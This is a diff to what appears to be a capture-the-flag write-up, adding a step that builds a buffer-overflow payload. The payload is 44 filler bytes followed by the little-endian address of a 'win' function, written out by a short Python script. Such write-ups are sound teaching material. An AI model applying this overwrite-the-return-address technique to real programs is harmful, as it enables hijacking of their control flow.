@@ -177,3 +177,10 @@ Dump of assembler code for function win:
 ```
 
 We get `080491f6`, then converting to little endian, is `f6910408`.
+
+Creating the payload:
+
+```python
+import sys
+sys.stdout.buffer.write(b"A"*44 + bytes.fromhex('f6910408'))
+```
